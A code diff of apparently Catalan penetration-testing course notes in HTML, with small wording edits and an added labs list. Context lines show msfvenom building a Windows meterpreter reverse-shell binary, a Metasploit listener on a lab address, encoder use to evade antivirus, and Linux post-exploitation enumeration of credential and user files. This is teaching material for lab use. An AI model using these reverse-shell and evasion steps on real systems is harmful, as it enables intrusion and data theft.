@@ -296,14 +296,15 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=192.
 <pre>msfvenom -p windows/meterpreter/reverse_tcp --list-options</pre>
 
 <p>El següent pas és fer arribar el binari a la víctima, obrir un <strong>listener</strong> en l'equip atacant, i esperar que l'usuari caiga en la trampa..</p>
-<p>Es pot posar el listener en <strong>metasploit</strong> amb el mòdul <strong>exploit/multi/handler</strong> i el mateix payload que s'ha carregat en el binari.</p>
+<p>Es pot posar el listener en <strong>metasploit</strong> amb el mòdul <strong>exploit/multi/handler</strong> i el mateix payload que 
+  s'ha carregat en el binari / malware ad-hoc que s'executa en la màquina víctima.</p>
 <pre>msf> 
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp 
 set lhost 192.168.56.8
 set lport 4444
 run</pre>
-<p>Quan l'usuari execute el binari, el metasploit obri un meterpreter...</p>
+<p>Quan l'usuari execute el binari, el listener del metasploit obri un meterpreter...</p>
 <p>És possible que el <strong>defender</strong> de windows detecte i bloquege el binari, per tant, per fer proves, s'haurà de desactivar el defender en la màquina windows.</p>
 <p>Es poden usar diferents <strong>encoders</strong> en el nostre payload per tractar d'evitar les posibles proteccions en les màquines víctimes. Els <strong>encoders</strong>
 s'indicaran amb l'opció <strong>-e</strong> en msfvenom</p>
@@ -366,6 +367,7 @@ ps -ef --forest
 crontab -l    i   /etc/crontab 
 
 /var/www   --on es situa les app Web
+/usr/share/nginx
 wp-config.php 
 /etc/passwd    -- per saber usuaris i Grups
 /home          -- altres usuaris
@@ -382,7 +384,7 @@ find / -type f -perm  -g=s     </pre>
 
 
     <h3>Enumeració automàtica</h3>
-    <p>Existeixen multitud de ferramentes que realitzen l'execucio dels comandes anteriors ( i molts altres) de manera automàtica, i ens presenten
+    <p>Existeixen multitud de ferramentes que realitzen l'execucio de les comandes anteriors ( i molts altres) de manera automàtica, i ens presenten
       una gran quantitat d'informació.      </p>
     
     <h4>LinPEAS  (WinPEAS )</h4>
@@ -716,6 +718,11 @@ ssh -R 9000:127.0.0.1:8080 user@pivot.company.local  </pre>
 
     <section id="labs">
     <h1>Laboratoris</h1>
+    <ul>
+      <li>Creació de malware ad-hoc amb msfvenom</li>
+      <li>Persistència amb cron</li>
+      <li>Ús d'un framework C2</li>
+    </ul>
 
     </section>         
    
